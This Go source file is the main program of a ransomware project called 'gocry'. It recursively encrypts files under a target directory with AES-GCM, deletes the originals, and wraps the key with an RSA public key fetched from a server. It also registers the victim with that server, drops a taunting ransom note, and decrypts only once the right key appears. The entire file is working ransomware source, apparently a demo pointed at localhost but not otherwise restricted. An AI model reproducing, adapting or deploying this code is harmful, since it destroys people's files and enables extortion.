package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/json"
	"encoding/pem"
	"errors"
	"io"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"strings"
	"time"

	"github.com/joho/godotenv"
	"github.com/nireo/gocry/utils"
	uuid "github.com/satori/go.uuid"
	"golang.org/x/exp/errors/fmt"
)

const message string = `
Hello, you've been infected by gocry. Your files have been encrypted using military grade encryption >:D.
Do not use any decryption software or change the files, otherwise they might be lost forever.

How to decrypt:
Run the decrypt_files providing the key file with the right key!
`

// Ransomware holds all the values and functions needed to operate the ransomware.
type Ransomware struct {
	key       []byte
	publicKey string
	rootDir   string
	publicIP  string
}

type victimIndentifier struct {
	UUID      string `json:"uuid"` // A unique id used to identify the victim
	IP        string `json:"ip"`
	Timestamp int64  `json:"timestamp"` // A timestamp of the infection
}

// GenNewKey creates a random 32-bit key using the std crypto library.
func (rw *Ransomware) GenNewKey() error {
	key, err := utils.Gen32BitKey()
	if err != nil {
		log.Fatal(err)
	}

	rw.key = key
	return nil
}

// checkIfEncrypted doesn't do any complex checking just checks if some of the files
// in the root directory end with .gocry. This is used because we don't want to encrypt
// multiples times if the program has already been run.
func checkIfEncrypted(path string) bool {
	files, err := ioutil.ReadDir(path)
	if err != nil {
		log.Fatal(err)
	}

	for _, f := range files {
		if f.IsDir() {
			if encrypted := checkIfEncrypted(path + f.Name()); encrypted {
				return true
			}
		} else {
			if strings.HasSuffix(f.Name(), ".gocry") {
				return true
			}
		}
	}

	return false
}

// encrypts a file at a given path using the given ransomware key. also adds the .gocry extension
func (rw *Ransomware) encryptSingleFile(path string) {
	data, err := ioutil.ReadFile(path)
	if err != nil {
		log.Fatal(err)
	}

	block, _ := aes.NewCipher(rw.key)
	gcm, err := cipher.NewGCM(block)

	if err != nil {
		log.Fatal(err.Error())
	}

	nonce := make([]byte, gcm.NonceSize())
	if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
		log.Fatal(err.Error())
	}

	if err := ioutil.WriteFile(path+".gocry", gcm.Seal(nonce, nonce, data, nil), 0666); err != nil {
		log.Fatal(err)
	}

	if err := os.Remove(path); err != nil {
		log.Fatal(err)
	}
}

func (rw *Ransomware) decryptSingleFile(path string) {
	data, err := ioutil.ReadFile(path)
	if err != nil {
		log.Fatal(err)
	}

	block, err := aes.NewCipher(rw.key)
	if err != nil {
		log.Fatal(err.Error())
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		log.Fatal(err.Error())
	}

	nonceSize := gcm.NonceSize()
	nonce, ciphertext := data[:nonceSize], data[nonceSize:]
	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		log.Fatal(err.Error())
	}

	// path[:len(path)-6] removes the .gocry extension from the filename -> test.png.gocry -> test.png
	if err := ioutil.WriteFile(path[:len(path)-6], plaintext, 0666); err != nil {
		log.Fatal(err)
	}

	if err := os.Remove(path); err != nil {
		log.Fatal(err)
	}
}

// This function is used recursively to encrypt all the subdirectories, and the files
// in those directores
func (rw *Ransomware) encryptDirectory(path string) {
	files, err := ioutil.ReadDir(rw.rootDir)
	if err != nil {
		log.Fatal(err)
	}

	for _, f := range files {
		if f.IsDir() {
			rw.encryptDirectory(path + "/" + f.Name())
		} else {
			rw.encryptSingleFile(path + "/" + f.Name())
		}
	}
}

// This function is used recursively to decrypt all the subdirectories, and the files
// in those directores
func (rw *Ransomware) decryptDirectory(path string) {
	files, err := ioutil.ReadDir(rw.rootDir)
	if err != nil {
		log.Fatal(err)
	}

	for _, f := range files {
		if f.IsDir() {
			rw.decryptDirectory(path + "/" + f.Name())
		} else {
			rw.decryptSingleFile(path + "/" + f.Name())
		}
	}
}

func (rw *Ransomware) checkIfActiveRansom() error {
	// first check if some of the files are encrypted.
	if encrypted := checkIfEncrypted(rw.rootDir); encrypted {
		return errors.New("some files are already encrypted")
	}

	// check if ransom.txt and key.txt exists in the root directory.
	if _, err := os.Stat(rw.rootDir + "/key.txt"); !os.IsNotExist(err) {
		return errors.New("a key.txt already exists: " + err.Error())
	}

	if _, err := os.Stat(rw.rootDir + "/ransom.txt"); !os.IsNotExist(err) {
		return errors.New("a ransom.txt file already exists: " + err.Error())
	}

	return nil
}

func main() {
	if err := godotenv.Load(); err != nil {
		log.Fatal(err)
	}

	ransomware := &Ransomware{}
	ransomware.GenNewKey()
	ransomware.rootDir = os.Getenv("root_dir")

	// Check if the user already has a ransom
	if err := ransomware.checkIfActiveRansom(); err != nil {
		log.Fatal(err)
	}

	// Create the message file
	file, err := os.Create(ransomware.rootDir + "/ransom.txt")
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()

	// Get block data from the server, this way the ransomware can run independently
	// without needing the public key with the file.
	resp, err := http.Get("http://localhost:8080/pubkey")
	if err != nil {
		log.Fatalf("error getting rsa pubkey from server: %s", err)
	}
	defer resp.Body.Close()
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Fatalf("error reading response body: %s", err)
	}

	block, _ := pem.Decode(body)
	if block == nil {
		log.Fatal("bad key data: not PEM-encoded")
	}

	if got, want := block.Type, "PUBLIC KEY"; got != want {
		log.Fatalf("unknown key type: %q, want %q", got, want)
	}

	pubkey, err := x509.ParsePKCS1PublicKey(block.Bytes)
	if err != nil {
		log.Fatalf("bad public key: %s", err)
	}

	out, err := rsa.EncryptOAEP(sha256.New(), rand.Reader, pubkey, ransomware.key, []byte("key.txt"))
	if err != nil {
		log.Fatalf("error while encrypting key content: %s", err)
	}

	ransomware.encryptDirectory(ransomware.rootDir)
	if err := ioutil.WriteFile(ransomware.rootDir+"/key.txt", out, 0600); err != nil {
		log.Fatalf("write output: %s", err)
	}

	uindef, err := uuid.NewV4()
	if err != nil {
		log.Fatalf("error creating an unique indentifier: %s", err)
	}

	reqBody, err := json.Marshal(&victimIndentifier{
		Timestamp: time.Now().Unix(),
		IP:        "127.0.0.1",
		UUID:      uindef.String(),
	})

	if err != nil {
		log.Fatalf("error marshaling victim data: %s", err)
	}

	resp, err = http.Post("http://localhost:8080/register", "application/json", bytes.NewBuffer(reqBody))
	if err != nil {
		log.Fatalf("error sending victim register request: %s", err)
	}

	if resp.StatusCode != 200 {
		log.Fatal("wrong response status code, stopping...")
	}

	if _, err := file.WriteString(message); err != nil {
		log.Fatal(err)
	}

	// Setup a infinite loop, which checks the valid key.
	for {
		fmt.Println("Checking key file...")
		key, err := ioutil.ReadFile(ransomware.rootDir + "/key.txt")
		if err != nil {
			time.Sleep(time.Minute * 3)
			continue
		}

		// check if the keys match
		if bytes.Equal(key, ransomware.key) {
			// The ransom has been paid so decrypt the files..
			ransomware.decryptDirectory(ransomware.rootDir)
			fmt.Println("Thank you for your cooperation!")
			break
		}
		fmt.Println("Key did not match, checking again in 3 minutes...")

		time.Sleep(time.Minute * 3)
	}
}
